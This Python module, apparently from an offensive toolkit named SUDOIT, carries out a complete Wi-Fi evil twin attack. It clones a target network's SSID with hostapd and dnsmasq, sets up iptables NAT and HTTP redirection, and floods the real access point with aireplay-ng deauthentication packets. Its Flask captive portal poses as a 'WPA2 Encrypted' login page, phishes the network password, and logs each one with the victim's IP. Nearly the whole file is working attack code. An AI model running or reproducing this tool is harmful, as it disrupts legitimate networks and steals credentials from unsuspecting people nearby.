#!/usr/bin/env python3
"""
SUDOIT Evil Twin Full Attack Module
Multi-terminal Evil Twin attack with Captive Portal.
Like Airgeddon but integrated in SUDOIT!

Opens 6 terminal windows:
  1. Fake Access Point (hostapd)
  2. DHCP/DNS Server (dnsmasq)
  3. Deauth Attack (aireplay-ng)
  4. Handshake Capture (airodump-ng)
  5. Captive Portal Web Server (Flask)
  6. Credential Monitor (real-time log)

Requirements:
  - hostapd, dnsmasq, iptables, xterm, tmux
  - Monitor mode interface
  - Internet-connected interface for routing
"""

import os
import sys
import time
import signal
import subprocess
import threading
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List

try:
    from flask import Flask, request, render_template_string, redirect
    FLASK_OK = True
except ImportError:
    FLASK_OK = False

try:
    from core.logger import get_logger
except ImportError:
    import logging
    def get_logger(name="SUDOIT"):
        return logging.getLogger(name)


class EvilTwinFull:
    """
    Full Evil Twin Attack with Multi-Terminal Support.
    
    Creates a rogue AP, deauths clients from legitimate AP,
    and captures credentials via captive portal.
    """
    
    def __init__(self, interface: str = "wlan0", logger=None):
        self.interface = interface
        self.mon_interface = interface + "mon"
        self.logger = logger or get_logger()
        self.running = False
        self.processes: List[subprocess.Popen] = []
        self.credentials: List[Dict] = []
        self._start_time = None
        
        # Config
        self.ap_ssid = "FreeWiFi"
        self.ap_channel = 6
        self.ap_bssid = None
        self.internet_iface = "eth0"
        self.ap_iface = "wlan0"
        self.captured_handshake = None
        
    def start(self, target_bssid: str, target_ssid: str, channel: int,
              internet_iface: str = "eth0", deauth_all: bool = True):
        """
        Launch full Evil Twin attack.
        
        Args:
            target_bssid: Legitimate AP BSSID to impersonate
            target_ssid: SSID to broadcast
            channel: WiFi channel
            internet_iface: Interface with internet access
            deauth_all: Deauth all clients (True) or targeted (False)
        """
        if not self._check_dependencies():
            return
        
        self.target_bssid = target_bssid
        self.ap_ssid = target_ssid
        self.ap_channel = channel
        self.internet_iface = internet_iface
        self.running = True
        self._start_time = time.time()
        
        print(f"\n{'='*60}")
        print(f"  SUDOIT Evil Twin Full Attack")
        print(f"{'='*60}")
        print(f"  Target BSSID: {target_bssid}")
        print(f"  Target SSID:  {target_ssid}")
        print(f"  Channel:      {channel}")
        print(f"  Internet:     {internet_iface}")
        print(f"{'='*60}\n")
        
        # Start monitor mode
        self._start_monitor_mode()
        
        # Create output directory
        self.output_dir = Path(f"/tmp/sudoit_eviltwin_{datetime.now():%Y%m%d_%H%M%S}")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.creds_file = self.output_dir / "credentials.txt"
        
        # Step 1: Create Fake AP config
        print("[*] Step 1: Creating Fake AP configuration...")
        self._create_hostapd_config()
        self._create_dnsmasq_config()
        
        # Step 2: Start Fake AP (Terminal 1)
        print("[*] Step 2: Starting Fake Access Point...")
        self._launch_terminal(
            "Fake AP",
            f"hostapd {self.output_dir}/hostapd.conf",
            1
        )
        time.sleep(2)
        
        # Step 3: Configure IP & Start DHCP (Terminal 2)
        print("[*] Step 3: Starting DHCP/DNS Server...")
        self._configure_ap_interface()
        self._launch_terminal(
            "DHCP/DNS",
            f"dnsmasq -C {self.output_dir}/dnsmasq.conf -d",
            2
        )
        time.sleep(1)
        
        # Step 4: Enable IP forwarding & NAT
        print("[*] Step 4: Enabling Internet routing...")
        self._enable_routing()
        
        # Step 5: Start Captive Portal (Terminal 3)
        print("[*] Step 5: Starting Captive Portal...")
        portal_thread = threading.Thread(target=self._start_captive_portal, daemon=True)
        portal_thread.start()
        time.sleep(2)
        
        # Step 6: Start Handshake Capture (Terminal 4)
        print("[*] Step 6: Starting Handshake Capture...")
        self._launch_terminal(
            "Handshake Capture",
            f"airodump-ng -c {self.ap_channel} --bssid {self.ap_bssid if self.ap_bssid else ''} -w {self.output_dir}/capture {self.mon_interface}",
            4
        )
        time.sleep(1)
        
        # Step 7: Deauth Attack (Terminal 5)
        print("[*] Step 7: Launching Deauth Attack...")
        if deauth_all:
            deauth_cmd = f"aireplay-ng -0 0 -a {target_bssid} {self.mon_interface}"
        else:
            deauth_cmd = f"aireplay-ng -0 0 -a {target_bssid} {self.mon_interface} --ignore-negative-one"
        
        self._launch_terminal("Deauth Attack", deauth_cmd, 5)
        
        # Step 8: Credential Monitor (Terminal 6)
        print("[*] Step 8: Starting Credential Monitor...")
        self._launch_terminal(
            "Credentials",
            f"watch -n 2 'cat {self.creds_file} 2>/dev/null || echo \"Waiting for credentials...\"'",
            6
        )
        
        print(f"\n{'='*60}")
        print(f"  All 6 terminals launched!")
        print(f"  Credentials will be saved to: {self.creds_file}")
        print(f"  Press Ctrl+C in THIS terminal to stop attack")
        print(f"{'='*60}\n")
        
        # Keep running until interrupted
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Stopping attack...")
            self.stop()
    
    def _check_dependencies(self) -> bool:
        """Verify all required tools are installed."""
        required = ["hostapd", "dnsmasq", "xterm", "aireplay-ng", "airodump-ng"]
        missing = []
        for tool in required:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            print(f"[✗] Missing: {', '.join(missing)}")
            print("    Install: sudo apt install hostapd dnsmasq xterm")
            return False
        
        if not FLASK_OK:
            print("[✗] Flask not installed. Install: pip install flask")
            return False
        
        return True
    
    def _start_monitor_mode(self):
        """Start monitor mode on interface."""
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        subprocess.run(["airmon-ng", "start", self.interface], capture_output=True)
        time.sleep(1)
        
        # Get our BSSID
        result = subprocess.run(["macchanger", "-s", self.mon_interface], 
                               capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "Current MAC" in line:
                self.ap_bssid = line.split(": ")[-1].strip()
                break
        if not self.ap_bssid:
            self.ap_bssid = "02:00:00:00:00:00"
    
    def _create_hostapd_config(self):
        """Create hostapd configuration file."""
        config = f"""
interface={self.mon_interface}
driver=nl80211
ssid={self.ap_ssid}
hw_mode=g
channel={self.ap_channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        config_path = self.output_dir / "hostapd.conf"
        config_path.write_text(config)
        self.logger.info(f"hostapd config created: {config_path}")
    
    def _create_dnsmasq_config(self):
        """Create dnsmasq configuration for DHCP/DNS."""
        config = f"""
interface={self.mon_interface}
dhcp-range=192.168.1.50,192.168.1.150,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
no-resolv
log-queries
log-dhcp
"""
        config_path = self.output_dir / "dnsmasq.conf"
        config_path.write_text(config)
        self.logger.info(f"dnsmasq config created: {config_path}")
    
    def _configure_ap_interface(self):
        """Configure IP address on AP interface."""
        subprocess.run(["ifconfig", self.mon_interface, "192.168.1.1", "netmask", "255.255.255.0"], 
                      capture_output=True)
        subprocess.run(["ifconfig", self.mon_interface, "up"], capture_output=True)
    
    def _enable_routing(self):
        """Enable IP forwarding and NAT for internet access."""
        # Enable IP forwarding
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        
        # Flush iptables
        subprocess.run(["iptables", "--flush"], capture_output=True)
        subprocess.run(["iptables", "--table", "nat", "--flush"], capture_output=True)
        subprocess.run(["iptables", "--delete-chain"], capture_output=True)
        subprocess.run(["iptables", "--table", "nat", "--delete-chain"], capture_output=True)
        
        # NAT rules
        subprocess.run([
            "iptables", "-t", "nat", "-A", "POSTROUTING",
            "-o", self.internet_iface, "-j", "MASQUERADE"
        ], capture_output=True)
        subprocess.run([
            "iptables", "-A", "FORWARD",
            "-i", self.mon_interface, "-o", self.internet_iface, "-j", "ACCEPT"
        ], capture_output=True)
        subprocess.run([
            "iptables", "-A", "FORWARD",
            "-i", self.internet_iface, "-o", self.mon_interface, "-m", "state",
            "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"
        ], capture_output=True)
        
        # Redirect HTTP to Captive Portal
        subprocess.run([
            "iptables", "-t", "nat", "-A", "PREROUTING",
            "-i", self.mon_interface, "-p", "tcp", "--dport", "80",
            "-j", "REDIRECT", "--to-port", "80"
        ], capture_output=True)
    
    def _launch_terminal(self, title: str, command: str, terminal_num: int):
        """Launch command in a new xterm window."""
        xterm_cmd = [
            "xterm", "-T", f"[SUDOIT] {title}",
            "-geometry", "80x15",
            "-bg", "black", "-fg", "#00ff00",
            "-fa", "Monospace", "-fs", "10",
            "-e", f"echo '=== {title} ===' && {command}; read -p 'Press Enter to close...'"
        ]
        
        proc = subprocess.Popen(xterm_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.processes.append(proc)
        print(f"  [Terminal {terminal_num}] {title} (PID: {proc.pid})")
    
    def _start_captive_portal(self):
        """Start Flask captive portal server."""
        app = Flask(__name__)
        creds_file = self.creds_file
        
        CAPTIVE_PORTAL_HTML = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>WiFi Login</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Segoe UI', Arial, sans-serif;
                    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }
                .container {
                    background: rgba(255,255,255,0.05);
                    border-radius: 15px;
                    padding: 40px;
                    max-width: 400px;
                    width: 90%;
                    box-shadow: 0 0 30px rgba(0,255,0,0.1);
                    border: 1px solid rgba(0,255,0,0.2);
                }
                h2 {
                    color: #00ff00;
                    text-align: center;
                    margin-bottom: 10px;
                    font-size: 1.5em;
                }
                p {
                    color: #888;
                    text-align: center;
                    margin-bottom: 30px;
                    font-size: 0.9em;
                }
                label {
                    color: #00cc00;
                    font-size: 0.9em;
                    display: block;
                    margin-bottom: 5px;
                }
                input {
                    width: 100%;
                    padding: 12px;
                    margin-bottom: 20px;
                    background: rgba(0,0,0,0.5);
                    border: 1px solid #333;
                    border-radius: 8px;
                    color: #00ff00;
                    font-size: 1em;
                }
                input:focus {
                    outline: none;
                    border-color: #00ff00;
                    box-shadow: 0 0 10px rgba(0,255,0,0.3);
                }
                button {
                    width: 100%;
                    padding: 12px;
                    background: #00cc00;
                    color: #000;
                    border: none;
                    border-radius: 8px;
                    font-size: 1em;
                    font-weight: bold;
                    cursor: pointer;
                    transition: all 0.3s;
                }
                button:hover {
                    background: #00ff00;
                    box-shadow: 0 0 20px rgba(0,255,0,0.5);
                }
                .footer {
                    text-align: center;
                    color: #555;
                    margin-top: 20px;
                    font-size: 0.8em;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>WiFi Authentication Required</h2>
                <p>Please enter your WiFi password to continue</p>
                <form method="POST" action="/login">
                    <label>WiFi Password:</label>
                    <input type="password" name="password" placeholder="Enter password..." required>
                    <button type="submit">Connect</button>
                </form>
                <div class="footer">Secure Connection • WPA2 Encrypted</div>
            </div>
        </body>
        </html>
        """
        
        SUCCESS_HTML = """
        <!DOCTYPE html>
        <html>
        <head><title>Connected</title></head>
        <body style="background:#0a0a0a;color:#00ff00;text-align:center;padding-top:100px;">
            <h1>✓ Connected Successfully!</h1>
            <p>You may now close this page.</p>
        </body>
        </html>
        """
        
        @app.route('/', methods=['GET'])
        def index():
            return CAPTIVE_PORTAL_HTML
        
        @app.route('/login', methods=['POST'])
        def login():
            password = request.form.get('password', '')
            ip = request.remote_addr
            
            credential = {
                "password": password,
                "ip": ip,
                "timestamp": datetime.now().isoformat()
            }
            self.credentials.append(credential)
            
            # Save to file
            with open(creds_file, 'a') as f:
                f.write(f"[{credential['timestamp']}] IP: {ip} | Password: {password}\n")
            
            print(f"\n[!] CREDENTIAL CAPTURED: {password} (from {ip})")
            self.logger.info(f"Credential captured: {password}")
            
            return SUCCESS_HTML
        
        @app.route('/generate_204', methods=['GET'])
        @app.route('/hotspot-detect.html', methods=['GET'])
        @app.route('/library/test/success.html', methods=['GET'])
        def captive():
            return redirect('/')
        
        try:
            self.logger.info("Captive portal starting on port 80")
            app.run(host='0.0.0.0', port=80, debug=False, use_reloader=False)
        except Exception as e:
            self.logger.error(f"Captive portal error: {e}")
    
    def get_credentials(self) -> List[Dict]:
        """Get captured credentials."""
        return self.credentials.copy()
    
    def stop(self):
        """Stop Evil Twin attack and cleanup."""
        print("\n[*] Stopping Evil Twin attack...")
        self.running = False
        
        # Kill all child processes
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass
        
        # Restore iptables
        subprocess.run(["iptables", "--flush"], capture_output=True)
        subprocess.run(["iptables", "--table", "nat", "--flush"], capture_output=True)
        
        # Disable IP forwarding
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        
        # Stop monitor mode
        subprocess.run(["airmon-ng", "stop", self.mon_interface], capture_output=True)
        subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True)
        
        print("[✓] Cleanup complete")
        self.logger.info("Evil Twin attack stopped")
    
    def get_status(self) -> Dict:
        """Get current attack status."""
        return {
            "running": self.running,
            "target_bssid": getattr(self, 'target_bssid', None),
            "ap_ssid": self.ap_ssid,
            "credentials_captured": len(self.credentials),
            "elapsed": time.time() - self._start_time if self._start_time else 0
        }
